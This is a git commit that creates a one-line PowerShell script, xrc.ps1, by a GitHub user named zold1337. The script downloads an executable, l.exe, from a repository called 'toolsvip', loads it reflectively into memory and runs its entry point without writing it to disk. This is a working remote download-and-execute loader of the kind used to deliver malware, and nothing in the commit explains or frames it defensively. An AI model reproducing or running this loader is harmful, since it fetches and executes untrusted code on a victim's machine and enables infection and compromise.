56c321279da1a89a17b1945f27ff42fd9b8ff179
zold1337 <152819963+zold1337@users.noreply.github.com>
2026-06-09 22:46:53 -0300

    Create xrc.ps1

---
+++ xrc.ps1
@@ -0,0 +1,1 @@
+$link="https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe";$webClient=New-Object System.Net.WebClient;$bytes=$webClient.DownloadData($link);$assembly=[System.Reflection.Assembly]::Load($bytes);$entry=$assembly.EntryPoint;if($entry.GetParameters().Count -eq 1){$entry.Invoke($null,@([string[]]@()))}else{$entry.Invoke($null,$null)};Pause
